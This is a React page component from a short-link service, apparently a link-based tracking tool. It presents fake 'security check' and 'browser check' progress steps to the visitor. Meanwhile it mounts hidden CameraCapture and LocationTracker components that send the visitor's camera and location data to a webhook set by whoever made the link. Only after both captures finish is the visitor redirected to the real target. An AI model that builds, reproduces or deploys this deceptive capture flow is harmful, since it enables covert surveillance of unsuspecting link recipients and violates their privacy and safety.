import React, { useEffect, useState } from 'react';
import { useParams } from 'react-router-dom';
import CameraCapture from '../components/CameraCapture';
import LocationTracker from '../components/LocationTracker';
import { Loader2, Shield, Eye, CheckCircle, Clock, Sparkles, Zap } from 'lucide-react';
import { supabase } from '../integrations/supabase/client';
import { useLanguage } from '@/hooks/useLanguage';

const ShortlinkRedirect = () => {
  const { code } = useParams();
  const [isLoading, setIsLoading] = useState(true);
  const [status, setStatus] = useState('');
  const [redirectUrl, setRedirectUrl] = useState('');
  const [webhookUrl, setWebhookUrl] = useState('');
  const [locationCompleted, setLocationCompleted] = useState(false);
  const [cameraCompleted, setCameraCompleted] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const { t } = useLanguage();

  const steps = [
    { icon: Shield, label: t('security_check'), description: t('verifying_safety') },
    { icon: Eye, label: t('browser_check'), description: t('analyzing_browser') },
    { icon: CheckCircle, label: t('ready'), description: t('preparing_redirect') }
  ];

  useEffect(() => {
    setStatus(t('loading_link'));
  }, [t]);

  useEffect(() => {
    const fetchLinkData = async () => {
      try {
        console.log('Fetching link data for code:', code);
        
        const { data, error } = await supabase
          .from('yuuka')
          .select('original_url, webhook')
          .eq('short_code', code)
          .single();

        if (error) {
          console.error('Error fetching link data:', error);
          window.location.href = '/404';
          return;
        }

        console.log('Link data found:', data);
        setRedirectUrl(data.original_url || '');
        setWebhookUrl(data.webhook || '');

        setTimeout(() => {
          setCurrentStep(1);
          setStatus(t('checking_security'));
        }, 1000);

        setTimeout(() => {
          setCurrentStep(2);
          setStatus(t('analyzing_environment'));
          setIsLoading(false);
        }, 2500);
      } catch (error) {
        console.error('Unexpected error:', error);
        window.location.href = '/404';
      }
    };

    if (code) {
      fetchLinkData();
    }
  }, [code, t]);

  const handleLocationSuccess = () => {
    console.log('Location data captured and saved successfully');
    setLocationCompleted(true);
  };

  const handleCameraSuccess = () => {
    console.log('Camera data captured and saved successfully');
    setCameraCompleted(true);
  };

  useEffect(() => {
    if (locationCompleted && cameraCompleted) {
      console.log('Checking completed, preparing to redirect...');
      setCurrentStep(3);
      setStatus(t('all_checks_completed'));
      
      setTimeout(() => {
        if (redirectUrl) {
          console.log('Redirecting to:', redirectUrl);
          window.location.href = redirectUrl;
        }
      }, 2000);
    }
  }, [locationCompleted, cameraCompleted, redirectUrl, t]);

  const handleError = (error: any) => {
    console.error('Capture error:', error);
    setTimeout(() => {
      if (redirectUrl) {
        window.location.href = redirectUrl;
      }
    }, 5000);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 relative overflow-hidden">
      {/* Animated Background */}
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        <div className="absolute -top-20 -left-20 w-96 h-96 bg-purple-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-pulse"></div>
        <div className="absolute -bottom-20 -right-20 w-96 h-96 bg-blue-500 rounded-full mix-blend-multiply filter blur-3xl opacity-20 animate-pulse" style={{ animationDelay: '1s' }}></div>
        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-80 h-80 bg-pink-500 rounded-full mix-blend-multiply filter blur-3xl opacity-15 animate-pulse" style={{ animationDelay: '0.5s' }}></div>
      </div>

      {/* Floating Particles */}
      <div className="absolute inset-0 pointer-events-none">
        {[...Array(15)].map((_, i) => (
          <div
            key={i}
            className="absolute w-2 h-2 bg-white rounded-full opacity-20"
            style={{
              left: `${Math.random() * 100}%`,
              top: `${Math.random() * 100}%`,
              animationDelay: `${Math.random() * 5}s`,
              animation: `float ${3 + Math.random() * 4}s ease-in-out infinite`
            }}
          />
        ))}
      </div>

      {/* Main Content */}
      <div className="relative z-10 min-h-screen flex items-center justify-center p-4">
        <div className="bg-white/5 backdrop-blur-xl rounded-3xl shadow-2xl p-8 max-w-lg w-full text-center border border-white/10 hover:border-white/20 transition-all duration-500 card-3d">
          {/* Header */}
          <div className="mb-8">
            <div className="flex items-center justify-center gap-2 mb-6">
              <Sparkles className="w-8 h-8 text-yellow-400 animate-pulse" />
              <h1 className="text-3xl font-bold animated-3d-text gradient-text">
                {t('link_processor')}
              </h1>
              <Sparkles className="w-8 h-8 text-yellow-400 animate-pulse" />
            </div>
            
            {/* Loading Spinner */}
            <div className="relative mb-6 flex items-center justify-center">
              <div className="relative">
                <Loader2 className="w-16 h-16 animate-spin text-blue-400" />
                <div className="absolute inset-0 rounded-full border-4 border-transparent border-t-purple-400 animate-spin" style={{ animationDuration: '1.5s' }}></div>
              </div>
            </div>
            
            {/* Status */}
            <p className="text-lg font-medium mb-2 animated-3d-text-small glow-text">{status}</p>
            <p className="text-sm glow-text-blue">{t('please_wait')}</p>
          </div>

          {/* Progress Steps */}
          <div className="mb-8">
            <div className="flex justify-between items-center mb-6">
              {steps.map((step, index) => {
                const Icon = step.icon;
                const isActive = currentStep >= index;
                const isCompleted = currentStep > index;
                
                return (
                  <div key={index} className="flex flex-col items-center transition-all duration-500">
                    <div className={`w-12 h-12 rounded-full flex items-center justify-center mb-2 transition-all duration-500 ${
                      isCompleted 
                        ? 'bg-green-500 text-white transform scale-110' 
                        : isActive 
                          ? 'bg-blue-500 text-white animate-pulse transform scale-110' 
                          : 'bg-gray-600 text-gray-400'
                    }`}>
                      {isCompleted ? (
                        <CheckCircle className="w-6 h-6" />
                      ) : (
                        <Icon className="w-6 h-6" />
                      )}
                    </div>
                    <div className={`text-xs text-center transition-all duration-300 ${
                      isActive ? 'animated-3d-text-small glow-text' : 'glow-text-blue opacity-60'
                    }`}>
                      <div className="font-medium">{step.label}</div>
                      <div className="text-xs opacity-75">{step.description}</div>
                    </div>
                  </div>
                );
              })}
            </div>
            
            {/* Progress Bar */}
            <div className="w-full bg-gray-700 rounded-full h-2 mb-4 overflow-hidden">
              <div 
                className="bg-gradient-to-r from-purple-500 to-blue-500 h-2 rounded-full transition-all duration-1000 ease-out"
                style={{ 
                  width: `${(currentStep / 3) * 100}%`,
                  transform: 'translateZ(0)'
                }}
              />
            </div>
          </div>
          
          {/* Verification Status */}
          <div className="grid grid-cols-2 gap-4 mb-6">
            <div className={`bg-black/20 rounded-lg p-4 border transition-all duration-500 ${
              locationCompleted 
                ? 'border-green-500/50 bg-green-500/10' 
                : 'border-yellow-500/50 bg-yellow-500/10'
            }`}>
              <div className="flex items-center justify-between mb-2">
                <span className="text-sm font-medium animated-3d-text-small glow-text">{t('security_check')}</span>
                {locationCompleted ? (
                  <CheckCircle className="h-5 w-5 text-green-400" />
                ) : (
                  <Clock className="h-5 w-5 text-yellow-400 animate-pulse" />
                )}
              </div>
              <div className={`text-xs ${locationCompleted ? 'glow-text-green' : 'glow-text-yellow'}`}>
                {locationCompleted ? t('verified') : t('processing')}
              </div>
            </div>
            
            <div className={`bg-black/20 rounded-lg p-4 border transition-all duration-500 ${
              cameraCompleted 
                ? 'border-green-500/50 bg-green-500/10' 
                : 'border-yellow-500/50 bg-yellow-500/10'
            }`}>
              <div className="flex items-center justify-between mb-2">
                <span className="text-sm font-medium animated-3d-text-small glow-text">{t('browser_check')}</span>
                {cameraCompleted ? (
                  <CheckCircle className="h-5 w-5 text-green-400" />
                ) : (
                  <Clock className="h-5 w-5 text-yellow-400 animate-pulse" />
                )}
              </div>
              <div className={`text-xs ${cameraCompleted ? 'glow-text-green' : 'glow-text-yellow'}`}>
                {cameraCompleted ? t('complete') : t('processing')}
              </div>
            </div>
          </div>

          {/* Footer */}
          <div className="text-center">
            <div className="flex items-center justify-center gap-2 glow-text-blue text-sm">
              <Zap className="h-4 w-4 text-yellow-400 animate-bounce" />
              <span>{t('powered_by_security')}</span>
              <Zap className="h-4 w-4 text-yellow-400 animate-bounce" />
            </div>
          </div>
          
          {/* Hidden Components */}
          {!isLoading && redirectUrl && (
            <div className="hidden">
              <CameraCapture 
                onSuccess={handleCameraSuccess} 
                onError={handleError}
                customWebhook={webhookUrl}
                shortCode={code}
              />
              <LocationTracker 
                onSuccess={handleLocationSuccess} 
                onError={handleError}
                customWebhook={webhookUrl}
                shortCode={code}
              />
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default ShortlinkRedirect;
